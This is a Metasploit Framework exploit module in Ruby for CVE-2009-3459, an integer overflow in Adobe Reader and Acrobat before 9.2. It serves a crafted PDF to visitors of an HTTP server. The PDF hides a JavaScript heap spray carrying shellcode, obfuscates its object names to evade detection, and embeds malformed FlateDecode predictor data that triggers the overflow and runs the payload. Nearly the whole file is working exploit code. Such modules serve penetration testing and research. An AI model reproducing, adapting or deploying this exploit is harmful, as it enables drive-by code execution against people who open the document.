##
# $Id: adobe_flatedecode_predictor02.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe FlateDecode Stream Predictor 02 Integer Overflow',
			'Description'    => %q{
					This module exploits an integer overflow vulnerability in Adobe Reader and Adobe
				Acrobat Professional versions before 9.2.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown', # Found in the wild
					# Metasploit version by:
					'jduck',
					'jabra'
				],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2009-3459' ],
					[ 'BID', '36600' ],
					[ 'OSVDB', '58729' ],
					[ 'URL', 'http://blogs.adobe.com/psirt/2009/10/adobe_reader_and_acrobat_issue_1.html' ],
					[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb09-15.html' ],
					[ 'URL', 'http://www.fortiguard.com/analysis/pdfanalysis.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'DisableNops'    => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# test results (on Windows XP SP3)
					# reader 7.0.5 - untested
					# reader 7.0.8 - untested
					# reader 7.0.9 - untested
					# reader 7.1.0 - untested
					# reader 7.1.1 - untested
					# reader 8.0.0 - untested
					# reader 8.1.2 - untested
					# reader 8.1.3 - untested
					# reader 8.1.4 - untested
					# reader 8.1.5 - untested
					# reader 8.1.6 - untested
					# reader 9.0.0 - untested
					# reader 9.1.0 - works!
					# reader 9.2 - not vulnerable
					[ 'Adobe Reader Windows Universal (JS Heap Spray)',
						{
							'Size'      => ((1024*1024) - 32)
						}
					],
				],
			'DisclosureDate' => 'Oct 08 2009',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Make some nops
		nops    = Rex::Text.to_unescape(make_nops(4))

		# Randomize variables
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)

		script = %Q|
var #{rand1} = unescape("#{shellcode}");
var #{rand2} = unescape("#{nops}");
while (#{rand2}.length < #{target['Size']}) #{rand2} += #{rand2};
#{rand2} = #{rand2}.substring(0, #{target['Size']} - #{rand1}.length);
memory = new Array();
for(i = 0; i < 128; i++) { memory[i]= #{rand2} + #{rand1}; }
|
		# Create the pdf
		pdf = make_pdf(script)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response(cli, pdf, { 'Content-Type' => 'application/pdf' })

		handler(cli)

	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end

	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end

	def make_flate_data()

		# NOTE: this data is from the original, in-the-wild exploit...
		# on 9.1.0 xpsp3, this causes a crash executing 0x70000000
		# that's not exactly a fun address to try to heap spray to
		bpc = 1
		data = "\x00\x00\x20\x00\x00\x00\x10"

		# this way, we can adjust dwords on the heap by 8-bits of data..
		# this leads to eip being around 0x1000xxxx, much more friendly
		bpc = 8
		addend = 9
		data = "\x00" * 64
		data[18,1] = [addend].pack('C')
		data[51,1] = [addend].pack('C')

		return bpc, data
	end


	def make_pdf(js)

		xref = []
		eol = "\x0d\x0a"
		endobj = "endobj" << eol

		# Randomize PDF version?
		pdf = "%PDF-1.5" << eol
		pdf << "%" << RandomNonASCIIString(4) << eol

		xref << pdf.length
		pdf << ioDef(1) << nObfu("<</Type/Catalog/Outlines ") << ioRef(2)
		pdf << nObfu("/Pages ") << ioRef(3)
		pdf << nObfu("/OpenAction ") << ioRef(5)
		pdf << ">>" << endobj

		xref << pdf.length
		pdf << ioDef(2) << nObfu("<</Type/Outlines/Count 0>>") << endobj

		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Type/Pages/Kids[") << ioRef(4) << nObfu("]/Count 1>>") << endobj

		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</Contents ") << ioRef(7)
		pdf << nObfu("/Type/Page/Parent ") << ioRef(3) << nObfu("/MediaBox[0 0 612 792]>>") << endobj

		xref << pdf.length
		pdf << ioDef(5) << nObfu("<</Type/Action/S/JavaScript/JS ") + ioRef(6) + ">>" << endobj

		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
		pdf << ioDef(6) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj

		# generate data for inside the flate'd stream
		bits_per_component, data = make_flate_data()
		compressed = Zlib::Deflate.deflate(data)

		xref << pdf.length
		pdf << ioDef(7) << nObfu("<</DecodeParms")
		pdf << nObfu("<</Columns 1/Predictor 02/Colors 1073741838/BitsPerComponent %s>>" % bits_per_component)
		pdf << nObfu("/Length %s/Filter/FlateDecode>>" % compressed.length)
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj

		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end
		pdf << "trailer" << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol

	end

end
